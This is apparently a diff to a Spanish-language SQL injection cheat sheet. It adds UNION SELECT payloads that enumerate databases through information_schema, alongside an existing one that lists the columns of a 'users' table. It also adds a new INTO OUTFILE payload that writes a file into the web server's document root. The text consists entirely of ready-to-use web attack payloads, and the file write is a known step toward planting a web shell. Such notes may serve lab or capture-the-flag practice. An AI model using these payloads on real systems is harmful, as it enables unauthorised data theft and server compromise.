@@ -5,7 +5,7 @@
 ### Listar bbdd
 
 ~~~
-' union select schema_name,null
+' union select schema_name,null from information_schema.schemata
 ~~~
 
 ### Listar tablas
@@ -18,4 +18,10 @@
 
 ~~~
 ' union select column_name,null from information_schema.columns where table_schema='products' and table_name='users'-- -
+~~~
+
+### Insertar fichero
+
+~~~
+union select 'hola' into outfile '/var/www/html/prueba.txt'-- -
 ~~~
